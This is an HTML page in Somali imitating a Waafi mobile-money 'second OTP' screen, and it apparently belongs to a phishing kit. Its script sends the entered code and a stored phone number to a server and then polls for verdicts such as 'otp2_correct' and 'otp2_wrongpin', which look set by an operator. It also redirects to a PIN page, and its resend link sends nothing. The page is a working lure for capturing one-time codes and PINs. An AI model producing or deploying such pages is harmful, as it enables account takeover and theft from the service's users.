<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - OTP 2</title>

    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }

        .container { flex: 1; padding: 40px 20px; text-align: center; }

        h2 { font-size: 22px; color: #333; margin-bottom: 10px; font-weight: 500; }
        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; }

        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }

        .otp-inputs input {
            width: 45px; height: 55px;
            border: 1.5px solid #ccc;
            border-radius: 8px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            outline: none;
        }

        .otp-inputs input:focus {
            border-color: #2ecc71;
            border-width: 2px;
        }

        .resend-text { font-size: 13px; color: #888; margin-bottom: 30px; }

        .btn-verify {
            width: 100%; max-width: 300px;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background-color: #e0e0e0;
            color: #a0a0a0;
            font-size: 14px;
            font-weight: bold;
            cursor: not-allowed;
            text-transform: uppercase;
        }

        .btn-verify.active {
            background-color: #2ecc71;
            color: white;
            cursor: pointer;
        }

        .footer {
            position: relative;
            height: 250px;
            background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px;
            border-top-right-radius: 50% 100px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 12px;
            margin-top: auto;
        }

        #status-msg {
            margin-top: 15px;
            font-size: 14px;
            font-weight: 500;
        }
    </style>
</head>

<body>

<div class="container">
    <h2>Xaqiijinta OTP-ga Labaad</h2>
    <p>Geli OTP-ga labaad ee loogu diray taleefankaaga si aad u sii waddo.</p>

    <div class="otp-inputs">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
    </div>

    <div class="resend-text" id="timer-text"></div>

    <button class="btn-verify" id="verify-btn">XAQIIJI OTP GA LABAAD</button>

    <div id="status-msg"></div>
</div>

<div class="footer">
    © 2026 Waafi Soomaaliya
</div>

<script>
const phone = localStorage.getItem('phone');

const inputs = document.querySelectorAll('.otp-inputs input');
const btn = document.getElementById('verify-btn');
const timerDisplay = document.getElementById('timer-text');
const statusMsg = document.getElementById('status-msg');

let countdown;
let pollingInterval;

window.onload = () => {
    if (!phone) {
        window.location.href = "/page6";   // ✅ FIXED (PIN PAGE)
    }
    startTimer();
};

/* TIMER */
function startTimer() {
    let secondsLeft = 60;
    clearInterval(countdown);

    countdown = setInterval(() => {
        secondsLeft--;

        if (secondsLeft <= 0) {
            clearInterval(countdown);
            timerDisplay.innerHTML =
                '<span id="resend-btn" style="color:#2ecc71; cursor:pointer;">Koodka dib u dir</span>';
            document.getElementById('resend-btn').onclick = resendCode;
        } else {
            timerDisplay.innerText = `Koodka mar kale u dir ${secondsLeft} ilbiriqsi`;
        }
    }, 1000);
}

function resendCode() {
    statusMsg.innerText = "Kood cusub ayaa la dirayaa...";
    statusMsg.style.color = "#333";
    startTimer();
}

/* INPUT */
inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
        checkFull();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

function checkFull() {
    const code = Array.from(inputs).map(i => i.value).join('');
    btn.classList.toggle('active', code.length === 6);
}

btn.addEventListener('click', submitOtp);

/* SUBMIT */
async function submitOtp() {
    if (!btn.classList.contains('active')) return;

    const otp = Array.from(inputs).map(i => i.value).join('');

    statusMsg.innerText = "Fadlan sug...";
    statusMsg.style.color = "#333";

    try {
        await fetch('/api/verify-second-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, otp })
        });
    } catch {}

    startPolling();
}

/* POLLING */
function startPolling() {
    clearInterval(pollingInterval);

    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
            const data = await res.json();

            if (data.status === "otp2_correct") {
                clearInterval(pollingInterval);
                window.location.href = "/success.html";
            }

            /* ❌ WRONG CODE (SOMALI) */
            if (data.status === "otp2_wrong") {
                clearInterval(pollingInterval);
                statusMsg.innerText = "❌ Koodhka waa khalad, fadlan dib u geli koodhka saxda ah";
                statusMsg.style.color = "red";
                resetInputs();
            }

            /* 🔑 WRONG PIN → GO BACK TO PAGE 6 */
            if (data.status === "otp2_wrongpin") {
                clearInterval(pollingInterval);
                statusMsg.innerText = "🔑 PIN waa khalad, fadlan geli PIN-ka saxda ah mar kale";
                statusMsg.style.color = "red";

                setTimeout(() => {
                    window.location.href = "/page6";   // ✅ FIXED
                }, 1500);

                resetInputs();
            }

        } catch {}
    }, 3000);
}

/* RESET */
function resetInputs() {
    inputs.forEach(i => i.value = "");
    btn.classList.remove('active');
}
</script>

</body>
</html>
